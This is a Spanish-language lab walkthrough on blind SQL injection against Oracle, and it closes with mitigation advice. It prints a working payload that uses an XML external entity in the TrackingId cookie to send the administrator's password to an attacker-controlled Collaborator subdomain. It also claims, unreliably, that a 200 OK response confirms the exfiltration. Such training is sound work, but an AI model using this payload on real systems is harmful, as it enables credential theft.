Blind SQL injection with out-of-band data exfiltration

Nombre del Laboratorio

Blind SQL injection with out-of-band data exfiltration.

Nivel

Practitioner (Nivel Intermedio).

Tipo de SQLi

Out-of-band SQL Injection con Exfiltración de Datos.

Introducción y Limitaciones Técnicas

En este ejercicio se trabaja sin Burp Suite Professional, por lo que no se cuenta con el módulo Collaborator. Se construyen manualmente los payloads y se valida la ejecución mediante respuestas HTTP 200 OK en la base de datos Oracle.

Objetivo del Laboratorio

Explotar la vulnerabilidad de inyección SQL ciega para extraer la contraseña del usuario administrator de la tabla users, forzando a la base de datos a realizar una petición externa con el dato robado.

Explicación Técnica de la Vulnerabilidad

La vulnerabilidad reside en la cookie TrackingId. Oracle permite el uso de funciones XML como EXTRACTVALUE y xmltype para interactuar con sistemas externos. Se aplica la técnica OAST concatenando la contraseña del administrador con un dominio externo controlado por el atacante.

Procedimiento Paso a Paso

Captura de Tráfico

Activar el Intercept en Burp Suite y refrescar la página principal del laboratorio. Identificar la cookie TrackingId.

Preparación en el Repeater

Enviar la petición al Repeater para modificar manualmente el payload.

Construcción del Payload de Exfiltración

Payload:
TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://' || (SELECT password FROM users WHERE username='administrator') || '.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--

Imagen 3

Codificación de Caracteres

Aplicar URL Encoding al payload para que los caracteres especiales sean procesados correctamente.

Imagen 4

Envío y Validación

Presionar Send y analizar la respuesta. El servidor devuelve HTTP/2 200 OK, confirmando la ejecución de la inyección.

Imagen 5

Análisis de Resultados

La respuesta 200 OK indica que Oracle aceptó la sentencia UNION SELECT, ejecutó la subconsulta para obtener la contraseña, concatenó el valor a la URL y realizó la petición externa. En un entorno con Burp Suite Professional, se vería la consulta DNS con la contraseña exfiltrada.

Mitigación Recomendada

Consultas Parametrizadas: Usar PreparedStatements para tratar la cookie como literal.
Desactivación de Funciones XML: Restringir permisos para evitar uso de EXTRACTVALUE o UTL_HTTP.
Segmentación de Red: Configurar firewalls para bloquear conexiones salientes innecesarias.
